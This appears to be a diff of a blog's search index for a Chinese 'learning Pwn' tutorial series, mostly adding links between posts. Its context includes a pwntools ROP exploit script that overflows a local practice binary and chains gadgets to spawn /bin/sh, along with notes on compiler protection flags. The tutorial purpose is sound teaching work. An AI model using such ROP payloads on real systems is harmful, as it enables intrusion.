@@ -3,7 +3,7 @@
   <entry>
     <title>汐白学Pwn-3.2(ROP-Intermediate)</title>
     <url>/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h2 id="上篇-汐白学Pwn-3-1-ROP-Basic"><a href="#上篇-汐白学Pwn-3-1-ROP-Basic" class="headerlink" title="上篇-汐白学Pwn-3.1(ROP-Basic)"></a><a href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/">上篇-汐白学Pwn-3.1(ROP-Basic)</a></h2>]]></content>
       <categories>
         <category>Pwn</category>
       </categories>
@@ -72,7 +72,8 @@
 
 <p>至此，相关片段都已经找好了，我们只需要构造一下payload，是其能完美调用这些片段并实现我们的目的就好。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./rop'</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">eax_addr = p32(<span class="number">0x80bb196</span>)</span><br><span class="line">binsh_addr = p32(<span class="number">0x80be408</span>)</span><br><span class="line">edx_ecx_ebx_addr = p32(<span class="number">0x806eb90</span>)</span><br><span class="line">int_addr = p32(<span class="number">0x8049421</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x70</span></span><br><span class="line">payload += eax_addr</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += edx_ecx_ebx_addr</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += binsh_addr</span><br><span class="line">payload += int_addr</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
+
+<h2 id="上篇-汐白学Pwn-2-SomeBasic"><a href="#上篇-汐白学Pwn-2-SomeBasic" class="headerlink" title="上篇-汐白学Pwn-2(SomeBasic)"></a><a href="http://xibai.xyz/2020/03/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-2(SomeBasic)/">上篇-汐白学Pwn-2(SomeBasic)</a></h2><h2 id="下篇-汐白学Pwn-3-2-ROP-Intermediate"><a href="#下篇-汐白学Pwn-3-2-ROP-Intermediate" class="headerlink" title="下篇-汐白学Pwn-3.2(ROP-Intermediate)"></a><a href="http://xibai.xyz/2020/04/24/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.2(ROP)/">下篇-汐白学Pwn-3.2(ROP-Intermediate)</a></h2>]]></content>
       <categories>
         <category>Pwn</category>
       </categories>
@@ -324,7 +325,7 @@ rbp-8 =&gt;  | canary value    |
 <li>PIE：-no-pie / -pie (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk</li>
 <li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</li>
 </ul>
-<h2 id="上篇-汐白学Pwn-1-准备"><a href="#上篇-汐白学Pwn-1-准备" class="headerlink" title="上篇-汐白学Pwn-1(准备)"></a><a href="http://xibai.xyz/2019/10/30/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-1(Ready)/">上篇-汐白学Pwn-1(准备)</a></h2><h2 id="下篇-汐白学pwn-3-1-ROP-Basic"><a href="#下篇-汐白学pwn-3-1-ROP-Basic" class="headerlink" title="下篇-汐白学pwn-3.1(ROP-Basic)"></a>下篇-汐白学pwn-3.1(ROP-Basic)</h2>]]></content>
+<h2 id="上篇-汐白学Pwn-1-准备"><a href="#上篇-汐白学Pwn-1-准备" class="headerlink" title="上篇-汐白学Pwn-1(准备)"></a><a href="http://xibai.xyz/2019/10/30/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-1(Ready)/">上篇-汐白学Pwn-1(准备)</a></h2><h2 id="下篇-汐白学pwn-3-1-ROP-Basic"><a href="#下篇-汐白学pwn-3-1-ROP-Basic" class="headerlink" title="下篇-汐白学pwn-3.1(ROP-Basic)"></a><a href="http://xibai.xyz/2020/04/07/%E6%B1%90%E7%99%BD%E5%AD%A6PWN-3.1(ROP)/">下篇-汐白学pwn-3.1(ROP-Basic)</a></h2>]]></content>
       <categories>
         <category>Pwn</category>
       </categories>
